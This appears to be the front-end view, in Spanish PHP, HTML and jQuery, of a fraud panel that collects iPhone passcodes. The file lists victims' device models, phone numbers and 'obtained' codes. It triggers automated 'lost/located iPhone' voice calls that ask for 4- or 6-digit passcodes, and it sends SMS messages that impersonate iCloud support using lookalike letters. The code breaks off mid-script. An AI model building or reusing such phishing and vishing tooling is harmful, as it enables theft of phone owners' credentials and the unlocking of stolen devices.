<!-- Content Wrapper. Contains page content -->
<div class="content-wrapper">
   <!-- Content Header (Page header) -->
   <section class="content-header">
      <div class="container-fluid">
         <div class="row mb-2">
            <?php if($server['status_msg_notificacion'] == 1){ ?>
             <div class="col-sm-12">
              <div class="card">
               <div class="card-body">
                  <?php if(!empty($server['msg_notificacion'])): echo $server['msg_notificacion']; endif;?>
               </div>
             </div>
            </div>
            <?php } ?>            
            <div class="col-sm-6">
               <h1>Código de acceso</h1>
            </div>
            <div class="col-sm-6">
               <ol class="breadcrumb float-sm-right">
                  <li class="breadcrumb-item"><a href="#">Código</a></li>
                  <li class="breadcrumb-item active">Acceso</li>
               </ol>
            </div>
         </div>
      </div>
      <!-- /.container-fluid -->
   </section>
   <!-- Main content -->
   <section class="content">
      <div class="container-fluid">
         <div class="row">
            <div class="col-md-12">
               <div class="card card-info">
                  <div class="card-header">
                     <h3 class="card-title">Código de acceso</h3>
                  </div>
                  <div class="card-body">
                     <div class="col-sm-6">
                        <h1>Datos obtenidos</h1>
                     </div>
                     <hr>
                     <div class="card-header">
                        <!--<h3 class="card-title">Lista de obtenidos</h3>-->
                        <div class="card-tools">
                           <div class="input-group input-group-sm">
                              <input type="text" class="form-control" id = "buscar" placeholder="Buscar proceso">
                              <div class="input-group-append">
                                 <div class="btn btn-primary" style="background-color: #28a745!important;">
                                    <i class="fas fa-search"></i>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <!-- /.card-tools -->
                     </div>
                     <div class="card-body table-responsive p-0 tablapasscode" style="max-height:300px;">
                        <table class="table table-sm table-hover">
                           <thead>
                              <tr>
                                 <th></th>
                                 <th>Usuario</th>
                                 <th>Dispositivo</th>
                                 <th>Número</th>
                                 <th>Código</th>
                                 <th>Estatus</th>
                                 <th>Acción</th>
                              </tr>
                           </thead>
                           <tbody id="body">
                              <div id="reload"></div>
                           </tbody>
                        </table>
                     </div>
                     <hr>
                     <div class="form-group">
                        <label class="col-md-3 col-form-label">
                        <button type="submit" class="btn btn-block btn-outline-primary waves-effect md-trigger" id="btnproceso" data-toggle="modal" data-target="#modalProceso">Agregar proceso</button>
                        </label>         
                     </div>
                     <!----MODAL PARA VISUALIZAR LOS DETALLES----->
                     <div class="modal fade" id="modalProceso" tabindex="-1" role="dialog"  data-backdrop="static" data-keyboard="false">
                        <div class="modal-dialog modal-sm" role="document">
                           <div class="modal-content">
                              <div class="modal-header" style="background: orange;">
                                 <h4 class="modal-title" id="smallModalLabel" style="font-size: 20px;text-align: center;">Añadir proceso</h4>
                              </div>
                              <div class="modal-body" id = "bodymodalproceso">
                                 <center><span style = "color:red;">Por favor elimine los caracteres antes de agregar para un mejor funcionamiento</span></center>
                                 <form class="form-horizontal form-bordered form-procesos">
                                    <div class="form-group">
                                       <label>Procesos existentes:</label>
                                       <select class="form-control" name="selectprocesos" id="selectprocesos">
                                          <option value="procesonuevo">Proceso nuevo</option>
                                          <?php foreach($procesos as $proc) { ?>
                                          <option value="<?php echo $proc->idequipos; ?>">
                                             <?php echo $proc->user .' .::. '.$proc->modelo; ?>
                                          </option>
                                          <?php } ?>
                                       </select>
                                    </div>
                                    <input type = "number" id = "idequipos" style = "display:none;">                                      
                                    <div class="form-group">
                                       <label>Usuario:</label>
                                       <div class="input-group">
                                          <div class="input-group-prepend">
                                             <span class="input-group-text"><i class="fas fa-user"></i></span>
                                          </div>
                                          <input type="text" class="form-control" placeholder="" id = "usuario" name="usuario" onKeyPress="return alfanumber(event)" required>
                                       </div>
                                    </div>
                                    <div class="form-group">
                                       <label>Modelo:</label>
                                       <div class="input-group">
                                          <div class="input-group-prepend">
                                             <span class="input-group-text"><i class="fas fa-user"></i></span>
                                          </div>
                                          <input type="text" class="form-control" placeholder="iPhone 11" id = "modelo" name="modelo" onKeyPress="return alfanumber(event)" required>
                                       </div>
                                    </div>
                                    <div class="form-group">
                                       <label>Prefijo sin + / Numero sin prefijo</label>
                                       <div class="input-group">
                                          <div class="input-group-prepend" style = "width: 20%;"> <span class="input-group-text" style = "padding: 0;background-color: #e9ecef00; border: 0;"><span id = "spanprefijo"><input type="let" class="form-control" placeholder="1" id = "prefijo" name="prefijo" onKeyPress="return soloNumeros(event)" required></span></span>
                                          </div>
                                          <input type="let" class="form-control" placeholder="1000000" id = "numero" name="numero" onKeyPress="return soloNumeros(event)" required>
                                       </div>
                                    </div>
                                    <div class="form-group">
                                       <label class="col-md-12 col-form-label">
                                          <button type="submit" class="btn btn-block btn-outline-primary" id="guardarproceso">
                                             Guardar proceso
                                       </label>
                                    </div>
                                 </form>
                              </div>
                              <div class="modal-footer">
                              <button type="button" class="btn btn-link waves-effect" style="display: none;">SAVE CHANGES</button>
                              <button type="button" class="btn btn-danger waves-effect" data-dismiss="modal"
                                 >
                              <i class="fa fa-close"></i>
                              <span>Cerrar</span>
                              </button> 
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="modal fade" id="modallamadas" tabindex="-1" role="dialog"  data-backdrop="static" data-keyboard="false">
                        <div class="modal-dialog modal-sm" role="document">
                           <div class="modal-content">
                              <div class="modal-header" style="background: orange;">
                                 <h4 class="modal-title" id="smallModalLabel" style="font-size: 20px;text-align: center;">Realizar llamada</h4>
                              </div>
                              <div class="modal-body" id = "bodymodalllamadas">
                              </div>
                              <div class="modal-footer">
                                 <button type="button" class="btn btn-link waves-effect" style="display: none;">SAVE CHANGES</button>
                                 <button type="button" class="btn btn-danger waves-effect" data-dismiss="modal" id = "cerrarModal">
                                 <i class="fa fa-close"></i>
                                 <span>Cerrar</span>
                                 </button> 
                              </div>
                           </div>
                        </div>
                     </div>

                     <div class="modal" id="modalsmssender">
               <div class="modal-dialog" role="document" tabindex="-1" role="dialog">
                  <div class="modal-content">
                     <!-- Modal Header -->
                     <div class="modal-header">
                        <h4 class="modal-title">SMS Sender</h4>
                        <button type="button" class="close" data-dismiss="modal">&times;</button>
                     </div>
                     <!-- Modal body -->
                     <div class="modal-body modal-body-smssender" style="">
                       <div id="loader-modal-body-smssender" >
                           <div class="loader-block">
                              <svg id="loader2" viewBox="0 0 100 100"><circle id="circle-loader2" cx="50" cy="50" r="45"></circle></svg>
                           </div>
                        </div>


                         <form class="form-horizontal form-bordered form-smssender" style="display: none;">
                           <div class="form-group">
                             <label>Selecione una API</label>
                             <select class="form-control" name="id_apisms_sender" id="id_apisms_sender">
                              <?php
                                foreach ($smsapi as $apisms) {
                                 echo '<option value = "'.$apisms->id_apisms.'">'.$apisms->descripcion_cliente.'</option>';
                                }
                              ?>
                             </select>
                           </div>

                           <div class="form-group">
                             <label>Selecione una remitente</label>
                             <select class="form-control" name="sender_id" id="sender_id">
                            
                             </select>
                           </div>  

                           <div class="form-group">
                            <div class="input-group">
                              <input type="number" class="form-control prefijo" placeholder="Num" id = "prefijo_sms" name="prefijo_sms" style="width: 20%; padding-right:0px;" required>
                              <input type="number" class="form-control " placeholder="Num" id = "numero_sms" name="numero_sms" style="width: 80%;" required>
                            </div>
                          </div>   

                        <div class="form-group">
                           <label>Selecione una plantilla</label>
                           <select class="form-control" name="plantilla_sms" id="plantilla_sms">
                           <?php
                              foreach ($plantillas as $plantillas_sms) {
                              echo '<option value = "'.$plantillas_sms->descripsms.'">'.$plantillas_sms->titulosms.'</option>';
                              }
                           ?>
                           </select>
                        </div>  

                        <div class="form-group">
                           <textarea class="form-control m-b-10" id="msg_sms" name="msg_sms" rows="3" placeholder="Su dispositivo {{model}} ha sido ubicado hoy a la(s) {{time}} Ver uItima locaIizacion: {{link}} Soporte iCIoud" required></textarea> 
                        </div> 

                        <button type="submit" class="btn btn-success" style="display: inline-block;">Enviar mensaje</button>
                        <div style = "color: gray;font-size: 15px;display: inline-block;" id="reloadsendsms"></div>
                           
                        </form>  


                         

                     </div>
                     <!-- Modal footer -->
                     <div class="modal-footer">
                        <button type="button" class="btn btn-info" data-dismiss="modal">Cerrar</button>
                     </div>
                  </div>
              </div>
            </div>
                  </div>
                  <!-- /.card-body -->
               </div>
               <!-- /.card -->
            </div>
         </div>
      </div>
      <div class="md-overlay"></div>
   </section>
   <!-- Control Sidebar -->
   <aside class="control-sidebar control-sidebar-dark">
      <!-- Control sidebar content goes here -->
   </aside>
   <!-- /.control-sidebar -->
   <!-- Main Footer -->
   <footer class="main-footer">
      <strong>Copyright &copy; 2022 <a href="<?php echo base_url();?>"><?php echo $server['descripcionserver']; ?></a>.</strong>
      Todos los derechos reservados
      <div class="float-right d-none d-sm-inline-block">
         <b>Version</b> 2.0
      </div>
   </footer>
</div>
<!-- ./wrapper -->
<!-- REQUIRED SCRIPTS -->
<!-- jQuery -->
<script src="<?php echo base_url();?>/public/assets/plugins/jquery/jquery.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/axios.min.js"></script>
<!-- Bootstrap -->
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- overlayScrollbars -->
<script src="<?php echo base_url();?>/public/assets/plugins/overlayScrollbars/js/jquery.overlayScrollbars.min.js"></script>
<!-- AdminLTE App -->
<script src="<?php echo base_url();?>/public/assets/dist/js/adminlte.js"></script>
<!-- OPTIONAL SCRIPTS -->
<script src="<?php echo base_url();?>/public/assets/dist/js/demo.js"></script>
<!-- PAGE PLUGINS -->
<!-- jQuery Mapael -->
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mousewheel/jquery.mousewheel.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/raphael/raphael.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mapael/jquery.mapael.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mapael/maps/usa_states.min.js"></script>
<!-- ChartJS -->
<script src="<?php echo base_url();?>/public/assets/plugins/chart.js/Chart.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/modal.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/classie.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/modalEffects.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/sweetalert2/sweetalert2.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/sms-counter.min.js"></script>
<script type="text/javascript">
   let base_url = location.href;
   let urlaccess = "<?=$server['urlaccess']?>";
   let token_access = "<?=$server['token_access']?>";
   let ip = "<?=$ip?>";
   let dominio  = "<?=$server['dominio']?>";
   let urlacortada_temp = '';
   let link_short_temp  = '';
   let link_long_temp   = '';
   let modelo_temp      = '';
   let niphone_temp     = '';
   let date_temp        = "<?=date("Y-m-d H:i:s")?>"
   let count_call = 0;
   
$(document).ready(function () {

    allsenderid($("#id_apisms_sender").val())
   setTimeout(function () {
      $(".theme-loader").fadeOut("slow");
   }, 500)

   $("#title").html($("#title").html() + " .::. Código de acceso")

   $(".li-codigoacceso").addClass('active')

   //allremoverPanel("");

})

 window.onload = (function(){
   try{
    $("#buscar").on('keyup', function(){
             
        $('#body').html('<td colspan="16" align="center"><div style = "color: gray;font-size: 15px;"><img src="../public/assets/server/img/loading.gif" /></div></td>')
        var value = $(this).val();
        if(value == ""){
             alldatos("");
           
        }else{
   
            alldatos(value);
        }
    }).keyup();
   }catch(e){}
   
   
   
});


$(document).on("submit", ".form-procesos", function (event) {

   event.preventDefault();

   const Toast = Swal.mixin({
      toast: true,
      position: 'top-end',
      showConfirmButton: false,
      timer: 3000
   });


   var data_form = {
      usuario: $("#usuario").val(),
      modelo: $("#modelo").val(),
      numero: $("#numero").val(),
      idequipos: $("#idequipos").val(),
      prefijo: $("#prefijo").val()
   }

   var url_php = '/codigoacceso/agregarProceso';
   $.ajax({
      type: 'POST',
      url: url_php,
      data: data_form,
      dataType: 'json',
      async: true,
      beforeSend: function () {},
   }).done(function ajaxDone(resp) {

      alldatos("")

      if (resp.status == true) {
         Toast.fire({
            type: 'success',
            title: '  Datos ingresados correctamente'
         })

         //actualizarnumberigresado($("#idequipos").val(), $("#prefijo").val(), $("#numero").val());

      } else {
         Toast.fire({
            type: 'error',
            title: '  Hubo un error al ingresar los datos'
         })
      }

      $("#usuario").val("");
      $("#modelo").val("");


   }).fail(function ajaxError(e) {
      console.log(e);
   }).always(function ajaxSiempre() {
      // console.log('Final de la llamada ajax.');
   })
   return false;


});

   function alldatos(buscar){
    
    var data_form = {
        buscar :buscar      
    }
    
    var url_php = '/codigoacceso/listado';
    $.ajax({
        type:'POST',
        url: url_php,
        data: data_form,
        dataType: 'json',
        async: true,
        beforeSend: function() {
         //('#reloadIcloud').html('<img src="../assets/img/loading.gif" /><a>Procesando<a>');
        },
    }).done(function ajaxDone(res){
        $('#reload').html('');
        $("#body").html('');
        if(res != null && $.isArray(res)){
            var i = 1;
            if(res == ""){
                $("#bodyt").html('<td colspan="16" align="center"><div style = "color: gray;font-size: 15px;">No tienes Requerimientos que mostrar</div></td>'); 
             
                
            }else{
            $.each(res, function(index, value){
   
              var color = "";
              if(value.estatus == 0){
               status = '<span class="badge badge-warning" style = "color: white; border-radius: 6px;">En proceso</span>';
              }else if(value.estatus == 1){                
               status = '<span class="badge badge-success" style = "color: white; border-radius: 6px;">Completado</span>';
              }else if(value.estatus == 2){                
               status = '<span class="badge badge-danger" style = "color: white; border-radius: 6px;">Fallido</span>';
              }
   
              btndel = "<td data-label='Acción' style = 'padding: 0.7em!important'><div class='btn-group' style = 'inline-size: max-content;'>"          
                          +"<font class='btn btn-success btn-sm' style = 'cursor: pointer;' onclick='callcenter("+value.prefijo+value.numero+","+value.id+")'><span class='fa fa-phone' aria-hidden='true'></span></font>" 
                          +"<font class='btn btn-info btn-sm' style = 'cursor: pointer;' onclick='smssender("+value.id+","+value.idequipos+")'><span class='fa fa-paper-plane-o' aria-hidden='true'></span></font>" 
                          + "</div></td>"; 

                var codigo = "";
                
                if(value.codigo == ""){
                 codigo = "En espera";
                }else{
                  codigo = value.codigo;
                }          
   
             $("#body").append("<tr>"
                                       + "<td style = 'padding: 0.7em!important'>"
                                       +"<div class='btn-group' style = 'inline-size: max-content;'>"
                                       + "<font class='btn btn-sm' style = 'cursor: pointer;' onclick='eliminarproceso("+value.id+")'><span class='fa fa-times' aria-hidden='true' style = 'color: #dc3545;font-size: 20px;'></span></font>"
                                       + "</div></td>"
                                       + "<td data-label='Usuario' style = 'padding: 0.7em!important'>" + value.usuario + "</td>"
                                       + "<td data-label='Nombre iPhone' style = 'padding: 0.7em!important'>" + value.modelo + "</td>"
                                      + "<td data-label='Model' style = 'padding: 0.7em!important'>" + value.prefijo + value.numero + "</td>"
                                       + "<td data-label='Nombre iPhone' style = 'padding: 0.7em!important; color:gray;'>"+codigo+"</td>"  
                                        + "<td data-label='Model' style = 'padding: 0.7em!important'>" + status + "</td>"
                                       +  btndel
                                       + "</tr>");    
   
   
              
               i++;
            });
            } 
        } 
   
   
      
    }).fail(function ajaxError(e){
        console.log(e);
    }).always(function ajaxSiempre(){
    })
    return false;  
   
   
   
   }


$("#selectprocesos").on('change', function(){
    
    if($("#selectprocesos").val() == 'procesonuevo'){
        $("#usuario").val("");
        $("#modelo").val("");
        $("#numero").val("");
        $("#idequipos").val("");
        $("#prefijo").val(""); 
      //  $("#prefijo").removeAttr("disabled","false")
      //  $("#numero").removeAttr("disabled","false")
    }else{
        
        var data_form = {
           idequipos :$("#selectprocesos").val()   
        }
    
        var url_php = '../equipos/getingresado';
        $.ajax({
          type:'POST',
          url: url_php,
          data: data_form,
          dataType: 'json',
          async: true,
          beforeSend: function() {
          },
       }).done(function ajaxDone(res){
           
        
        if(res['numero'] == ""){
            $("#prefijo").val("");   
        }else{
            $("#prefijo").val(res['pais']);  
        }
        
         $("#idequipos").val(res['idequipos']);  
         $("#usuario").val(res['user'].replace(/[&\/\\#,+()$~%.'"”:*?<>{}]/g, ''));
         $("#modelo").val(res['modelo'].replace(/[&\/\\#,+()$~%.'"”:*?<>{}]/g, ''));
         $("#numero").val(res['numero']);   
        // $("#prefijo").attr("disabled","true")
        // $("#numero").attr("disabled","true")
           
           
           
       }).fail(function ajaxError(e){
       
       }).always(function ajaxSiempre(){
     
       })
       
       return false;        
        
        
        
    }
    
    
})


function eliminarproceso(id){
  Swal.fire({
    title: 'Estás seguro que desea eliminar este requerimiento?',
    text: "<-- Selecciona una opción -->",
    icon: 'warning',
    showCancelButton: true,
    confirmButtonColor: '#3085d6',
    cancelButtonColor: '#d33',
    confirmButtonText: 'Si'
 }).then((result) => {
   if (result.value) {



       var data_form = {
         id : id     
      }

      var url_php = '/codigoacceso/eliminarProceso';
      $.ajax({
         type:'POST',
         url: url_php,
         data: data_form,
         dataType: 'json',
         async: true,
         beforeSend: function() {
          //('#reloadIcloud').html('<img src="../assets/img/loading.gif" /><a>Procesando<a>');
         },
      }).done(function ajaxDone(res){

        if(res.status == true){

           Swal.fire(
            'Eliminado!',
            'El requerimiento ha sido eliminado.',
            'success'
           )

          alldatos("") 

           

        }
          
           
        
      })


     
  }
})
}



function alfanumber(event) {
   var regex = new RegExp("^[a-zA-Z0-9 ]+$");
   var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
   if (!regex.test(key)) {
      event.preventDefault();
      return false;
   }
}

function soloNumeros(e) {
   var key = window.event ? e.which : e.keyCode;
   if (key < 48 || key > 57) {
      e.preventDefault();
   }
}

/****INICIO DE LLAMADAS****/


function callcenter(numero, id) {
  count_call = 0;
   $('#modallamadas').modal('show')

   html = '<form class="form-horizontal form-bordered form-call" novalidate>' +
      '<div class="form-group">' +
      '<div id = "divaudio"></div>' +
      '<input type="text" id = "inputplay" name = "inputplay" style = "display:none;">' +
      '</div>' +
      '<div class="form-group">' +
      '<select class="form-control" name="selecmetodo" id="selecmetodo" onchange = "cambiarIdioma()" ><option value = "selectmetodo">Seleccione un metodo</option><option value = "passcodenew">Pass Code V2</option><option value = "dpcodigo4">Dispositivo perdido 4</option><option value = "dpcodigo6">Dispositivo perdido 6</option><option value = "ipPerdidoES">iPhone perdido (ES)</option><option value = "ipPerdidoEN">iPhone perdido (EN)</option><option value = "ipPerdidoIN">iPhone perdido (INGLES-6)</option><option value = "iplocalizadoes">iPhone localizado (ES)</option><option value = "iplocalizadoen">iPhone localizado (EN-6)></option><option value = "ipPerdidoEN2">iPhone localizado (EN-4)</option></select>' +
      '<div id = "divaudio"></div>' +
      '<input type="text" id = "inputplay" name = "inputplay" style = "display:none;">' +
      '</div>' +
      '<div class="form-group">' +
      '<select class="form-control" name="selecidioma" id="selecidioma" onchange = ""  style = "display:none;"><option value = "selecidioma">Seleccione un idioma</option><option value = "PT">Portugues</option><option value = "ES">Español</option><option value = "EN">Ingles</option></select>' +
      '<select class="form-control" name="selecidiomaPassCodeV2" id="selecidiomaPassCodeV2" style = "display:none;"><option value = "selecidioma">Seleccione un idioma</option><option value = "ES_M_6">ESPAÑOL (MASCULINO) P6</option><option value = "ES_M_4">ESPAÑOL (MASCULINO) P4</option><option value = "ES_F_6">ESPAÑOL (FEMENINO) P6</option><option value = "ES_F_4">ESPAÑOL (FEMENINO) P4</option><option value = "PT_F_6">PORTUGUES (FEMENINO) - P6</option><option value = "PT_F_4">PORTUGUES (FEMENINO) - P4</option><option value = "EN_F_6">INGLES (FEMENINO) P6</option><option value = "EN_F_4">INGLES (FEMENINO) P4</option><option value = "EN_M_6">INGLES (MASCULINO) P6</option><option value = "EN_M_4">INGLES (MASCULINO) P4</option></select>' +
      '<div id = "divaudio"></div>' +
      '<input type="text" id = "inputplay" name = "inputplay" style = "display:none;">' +
      '</div>' +
      '<hr>' +
      '<input type = "text" id = "idproceso" value = "' + id + '" style = "display:none;">' +
      '<input type = "text" id = "udd" style = "display:none;">' +
      '<div class="input-group input-group-sm">' +
      '<div class="input-group"><span class="input-group-addon"><i class="fa "></i></span><div class="form-line" style= "padding-bottom: 10px;"><input type="number" class="form-control input-form-call2" placeholder="00000000000" value = "' + numero + '" id = "numerosend" ></div></div>' +
      '<button type="submit" class="btn btn-success btn-circle-lg waves-effect waves-circle waves-float  btn-sendcall"><i class="fa fa-arrow-circle-o-up"></i> Llamar</button> ' +
      '<button type="button" class="btn btn-danger btn-circle-lg waves-effect waves-circle waves-float" id = "btncancelledcall" ><i class="fa fa fa fa-arrow-circle-o-down"></i> Colgar</button>' +
      '</div>' +
      '</form>' +
      '<div id = "callloader"></div>';
   $("#bodymodalllamadas").html(html)


   $("#btncancelledcall").on('click', function () {
      var response = "";
      count_call = 0;

      if ($("#udd").val() == "") {
         $("#callloader").html("")
      } else {
         var data_form = {
            idcall: $("#udd").val()
         }


         var url_php = '../api/passcode/passcode/cancelarcall';

         $.ajax({
            type: 'POST',
            url: url_php,
            data: data_form,
            dataType: 'json',
            async: false,
         }).done(function ajaxDone(res) {
              
              location.reload()

            if (res.status2 == "cancelled") {

               $("#callloader").html("")
               html = '';
               html = '<br><center><img src="../public/assets/server/img/cancelled.gif" style = "width:150px; height:150px;"/></center>';
               $("#callloader").html(html)


            }


         }).fail(function ajaxError(e) {
            console.log(e);
         }).always(function ajaxSiempre() {
            console.log('Final de la llamada ajax.');
         })

      }
   })


   $("#cerrarModal").on('click', function () {

      var response = "";
     count_call = 0;

      if ($("#udd").val() == "") {
         $('#modalLlamadas').modal('hide')
      } else {
         var data_form = {
            idcall: $("#udd").val()
         }


         var url_php = '../api/passcode/passcode/cancelarcall';

         $.ajax({
            type: 'POST',
            url: url_php,
            data: data_form,
            dataType: 'json',
            async: false,
         }).done(function ajaxDone(res) {
             
             location.reload()

            if (res.status2 == "cancelled") {

               $("#callloader").html("")
               html = '';
               html = '<br><center><img src="../public/assets/server/img/cancelled.gif" style = "width:150px; height:150px;"/></center>';
               $("#callloader").html(html)

               $('#modalLlamadas').modal('hide')

            }else{
               $('#modalLlamadas').modal('hide')
            }


         }).fail(function ajaxError(e) {
            console.log(e);
         }).always(function ajaxSiempre() {
            console.log('Final de la llamada ajax.');
         })


      }

   })


}


function cambiarIdioma(){
       
    if($("#selecmetodo").val() == "passcodenew"){
        $("#selecidiomaPassCodeV2").show();
        $("#selecidioma").hide();
    }else if($("#selecmetodo").val() == "selectmetodo"){
        $("#selecidiomaPassCodeV2").hide();
        $("#selecidioma").hide();
    }else{
        $("#selecidiomaPassCodeV2").hide();
        $("#selecidioma").show();         
        
    }
}



$(document).on("submit", ".form-call", function(event){
 count_call = 0;
  event.preventDefault();

  const Toast = Swal.mixin({
      toast: true,
      position: 'top-end',
      showConfirmButton: false,
      timer: 3000
    });  

  

    if($("#selecmetodo").val() == "selectmetodo"){

      Toast.fire({
          type: 'error',
          title: '&nbsp; Debe seleccionar una opción valida.'
      }) 

    }else{

      if($("#numerosend").val() == ""){

         Toast.fire({
              type: 'error',
              title: '&nbsp; Ingrese un número de teléfono válido.'
          }) 

      }else{
           

     var html = "";
     html = '<div class="loader animation-start">'
         + '<span class="circle delay-1 size-2"></span>'
         + '<span class="circle delay-2 size-4"></span>'
         + '<span class="circle delay-3 size-6"></span>'
         + '<span class="circle delay-4 size-7"></span>'
         + '<span class="circle delay-5 size-7"></span>'
         + '<span class="circle delay-6 size-6"></span>'
         + '<span class="circle delay-7 size-4"></span>'
         + '<span class="circle delay-8 size-2"></span>'         
         + '</div>'
         + '<div class="preloader3 loader-block" style = "width:  155px;height: 16px;">'
         + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">C</div>'
         + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">o</div>'
         + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">n</div>'
         + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">e</div>'
         + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">c</div>'
         + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">t</div>'
         + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
         + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">n</div>'
         + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">d</div>'
         + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">o</div>'
         + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
         + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
         + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
         + '</div>';

    $("#callloader").html(html)




      var data_form = {
        id     : $('#idproceso').val(),
        numero : $("#numerosend").val(),
        metodo : $("#selecmetodo").val(),
        idioma     : $("#selecidioma").val(),
        idiomapcv2 : $("#selecidiomaPassCodeV2").val()
      }

      console.log(data_form)
     

     var url_php = '../api/passcode/passcode/llamar';

      $.ajax({
        type:'POST',
        url: url_php,
        data: data_form,
        dataType: 'json',
        async: true,
    }).done(function ajaxDone(res){

      


      var html = "";
      var idcall = "";

          idcall  = res.idcall;
         
          $("#udd").val(res.idcall);

          if(res.credito == true){
              

                  const timeValue = setInterval((interval) => {
                  console.log(ajaxprocesscall(res.idcall, res.cantcall))
                  if(ajaxprocesscall(res.idcall, res.cantcall) == "ringing"){
                     $("#btncancelledcall").removeClass("disabled");
                     html = '';
                     html = '<br><center><img src="../public/assets/server/img/ringing.gif" style = "width:150px; height:150px;"/></center>'
                      + '<div class="preloader3 loader-block" style = "width:  155px;height: 16px;">'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">M</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">r</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">c</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">n</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">d</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">o</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '</div>';
                     $("#callloader").html(html)        
                    }else if(ajaxprocesscall(res.idcall, res.cantcall) == "answered" || ajaxprocesscall(res.idcall, res.cantcall) == "in-progress"){
                      $("#btncancelledcall").removeClass("disabled");
                       html = '<center><img src="../public/assets/server/img/answered.gif" style = "width:250px; height:200px;"/></center>'
                      + '<div class="preloader3 loader-block" style = "width:  155px;height: 16px;">'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">C</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">o</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">n</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">t</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">e</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">s</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">t</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">d</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">.</div>'
                      + '</div>';
                      $("#callloader").html(html)  
                    }else if(ajaxprocesscall(res.idcall, res.cantcall) == "completed"){
                      $("#btncancelledcall").removeClass("disabled");
                      html = '';
                      html = '<br><center><img src="../public/assets/server/img/completed.gif" style = "width:150px; height:150px;"/></center>'
                      + '<div class="preloader3 loader-block" style = "width:  155px;height: 16px;">'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">C</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">o</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">m</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">p</div>'
                      + '<div class="circ1 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">l</div>'
                      + '<div class="circ2 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">e</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">t</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
                      + '<div class="circ3 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">d</div>'
                      + '<div class="circ4 loader-primary" style = "background-color: #448aff00; font-size: 20px; color: gray;">a</div>'
